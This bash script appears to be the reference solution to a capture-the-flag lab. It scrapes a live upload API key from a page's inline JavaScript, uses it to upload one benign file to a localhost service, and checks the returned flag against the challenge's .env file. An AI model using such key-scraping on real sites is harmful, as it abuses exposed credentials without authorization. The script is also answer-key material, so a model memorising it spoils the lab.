#!/usr/bin/env bash
# ============================================================
# StorefrontUpload (labs17) — reference solution: live API
# key in client-side source
#
# Chain: read the upload key from the landing page's inline
# JavaScript -> upload ONE benign file with the key only in
# the URL query parameter (never inside the file body, which
# would become publicly readable) -> flag in the response.
#
# Usage: ./run.sh [base-url]     (default http://localhost:8097)
# Prints the flag on stdout; exit 0 on success.
# ============================================================
set -euo pipefail

BASE="${1:-http://localhost:8097}"
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"

echo "[*] recovering the upload key from the page source" >&2
KEY="$(curl -fsS "$BASE/" | grep -oE 'UPLOAD_API_KEY = "[^"]+"' | head -n1 | cut -d'"' -f2)"
[[ -n "$KEY" ]] || { echo "[-] failed: upload key not found in page source" >&2; exit 1; }

tmp="$(mktemp)"
trap 'rm -f "$tmp"' EXIT
echo "upload test" > "$tmp"

echo "[*] uploading one benign file (key stays in the query parameter)" >&2
RESP="$(curl -fsS -X POST "$BASE/upload?key=$KEY" -F "file=@$tmp")"

flag="$(python3 -c 'import sys,json; print(json.load(sys.stdin).get("flag",""))' <<<"$RESP")"
if [[ -z "$flag" ]]; then
  echo "[-] failed: no flag in response: $RESP" >&2
  exit 1
fi

echo "$flag"
expected="$(sed -n 's/^FLAG="\([^"]*\)"$/\1/p' "$SCRIPT_DIR/../challenge/.env")"
if [[ "$flag" == "$expected" ]]; then
  echo "[+] PASS: flag matches challenge/.env" >&2
else
  echo "[-] FAIL: got $flag, expected $expected" >&2
  exit 1
fi
